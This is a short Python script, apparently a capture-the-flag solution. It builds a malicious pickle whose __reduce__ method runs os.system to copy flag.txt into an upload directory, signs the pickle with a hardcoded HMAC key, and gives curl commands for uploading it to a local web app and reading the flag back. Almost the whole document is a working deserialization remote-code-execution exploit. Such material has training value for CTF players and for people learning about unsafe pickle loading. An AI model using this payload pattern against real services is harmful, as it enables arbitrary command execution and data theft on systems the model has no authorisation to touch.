# attack scenario (test)
# this is the script file which the attacker uses in his local PC
import pickle, os, hashlib, hmac

class RCE:
    def __reduce__(self):
        return (os.system, ("cat flag.txt > app/uploads/{your_uuid}/hacked.txt",))

SECRET_KEY = "pickle_tickle"
payload = pickle.dumps(RCE())
sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print(f"HMAC signature: {sig}")

# hacker then uploads the malicious.pkl file on the website
'''
curl -X POST http://127.0.0.1:5000/upload \
  -F "file=@malicious.pkl" \
  -F "sig=02c4..."  # requires correct sig here
'''

# 1. generate hacked.txt below app/uploads/{your_uuid}
# 2. check the flag by $ curl http://localhost:916/uploads/{your_uuid}/hacked.txt
